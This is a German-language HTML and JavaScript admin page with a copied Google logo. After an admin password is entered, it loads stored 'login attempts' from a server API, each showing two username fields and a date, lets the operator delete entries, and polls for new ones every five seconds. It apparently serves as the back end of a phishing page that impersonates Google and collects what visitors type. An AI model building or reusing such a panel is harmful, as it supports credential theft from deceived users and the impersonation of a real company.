<!DOCTYPE html>
<html lang="de">

<head>
    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>Admin – Benutzer</title>

    <style>

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        body {
            background: #f8f9fa;
            color: #202124;
            min-height: 100vh;
            padding: 40px 20px;
        }

        .container {
            max-width: 800px;
            margin: auto;
        }

        .logo {
            text-align: center;
            font-size: 32px;
            font-weight: 500;
            margin-bottom: 15px;
            letter-spacing: -2px;
        }

        .blue { color: #4285f4; }
        .red { color: #ea4335; }
        .yellow { color: #fbbc05; }
        .green { color: #34a853; }

        h1 {
            text-align: center;
            font-weight: 400;
            margin-bottom: 10px;
        }

        .subtitle {
            text-align: center;
            color: #5f6368;
            margin-bottom: 30px;
        }

        .login-box {
            background: white;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 25px;
        }

        .login-box input {
            width: 100%;
            height: 50px;
            padding: 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 15px;
            outline: none;
        }

        button {
            border: none;
            border-radius: 4px;
            padding: 11px 20px;
            background: #1a73e8;
            color: white;
            font-weight: 500;
            cursor: pointer;
        }

        button:hover {
            background: #1765c1;
        }

        .attempt {
            background: white;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 15px;
        }

        .username {
            font-size: 17px;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .second {
            font-size: 17px;
            margin-bottom: 12px;
        }

        .date {
            color: #5f6368;
            font-size: 13px;
            margin-bottom: 15px;
        }

        .delete {
            background: #d93025;
            font-size: 13px;
        }

        .delete:hover {
            background: #b3261e;
        }

        .message {
            text-align: center;
            color: #5f6368;
            margin: 20px 0;
        }

        #attempts {
            display: none;
        }

    </style>
</head>

<body>

<div class="container">

    <div class="logo">
        <span class="blue">G</span>
        <span class="red">o</span>
        <span class="yellow">o</span>
        <span class="blue">g</span>
        <span class="green">l</span>
        <span class="red">e</span>
    </div>

    <h1>Benutzer</h1>

    <p class="subtitle">
        Gespeicherte Eingaben
    </p>


    <div
        id="loginBox"
        class="login-box"
    >

        <input
            id="adminPassword"
            type="password"
            placeholder="Admin-Passwort"
        >

        <button onclick="login()">
            Anzeigen
        </button>

    </div>


    <div
        id="message"
        class="message"
    ></div>


    <div id="attempts"></div>

</div>


<script>

    let adminPassword = "";


    async function login() {

        adminPassword =
            document.getElementById(
                "adminPassword"
            ).value;

        if (!adminPassword) {

            showMessage(
                "Bitte Admin-Passwort eingeben."
            );

            return;
        }

        await loadAttempts();
    }


    async function loadAttempts() {

        try {

            const response =
                await fetch(
                    "/api/login-attempts",
                    {
                        headers: {
                            "x-admin-password":
                                adminPassword
                        }
                    }
                );


            if (response.status === 401) {

                showMessage(
                    "Falsches Admin-Passwort."
                );

                return;
            }


            const attempts =
                await response.json();


            document.getElementById(
                "loginBox"
            ).style.display = "none";


            document.getElementById(
                "attempts"
            ).style.display = "block";


            renderAttempts(attempts);


        } catch (error) {

            showMessage(
                "Server nicht erreichbar."
            );

        }

    }


    function renderAttempts(attempts) {

        const container =
            document.getElementById(
                "attempts"
            );


        container.innerHTML = "";


        if (attempts.length === 0) {

            container.innerHTML = `
                <div class="message">
                    Noch keine Einträge.
                </div>
            `;

            return;
        }


        attempts.forEach(attempt => {

            const box =
                document.createElement("div");

            box.className =
                "attempt";


            const first =
                document.createElement("div");

            first.className =
                "username";

            first.textContent =
                "Benutzername 1: " +
                attempt.username1;


            const second =
                document.createElement("div");

            second.className =
                "second";

            second.textContent =
                "Benutzername 2: " +
                attempt.username2;


            const date =
                document.createElement("div");

            date.className =
                "date";

            date.textContent =
                new Date(
                    attempt.created_at
                ).toLocaleString("de-DE");


            const deleteButton =
                document.createElement("button");

            deleteButton.className =
                "delete";

            deleteButton.textContent =
                "Eintrag löschen";


            deleteButton.onclick =
                () => deleteAttempt(
                    attempt.id
                );


            box.appendChild(first);
            box.appendChild(second);
            box.appendChild(date);
            box.appendChild(deleteButton);


            container.appendChild(box);

        });

    }


    async function deleteAttempt(id) {

        if (
            !confirm(
                "Diesen Eintrag wirklich löschen?"
            )
        ) {
            return;
        }


        const response =
            await fetch(
                "/api/login-attempts/" + id,
                {
                    method: "DELETE",

                    headers: {
                        "x-admin-password":
                            adminPassword
                    }
                }
            );


        if (response.ok) {

            loadAttempts();

        } else {

            showMessage(
                "Eintrag konnte nicht gelöscht werden."
            );

        }

    }


    function showMessage(text) {

        document.getElementById(
            "message"
        ).textContent = text;

    }


    setInterval(() => {

        if (adminPassword) {
            loadAttempts();
        }

    }, 5000);

</script>

</body>

</html>
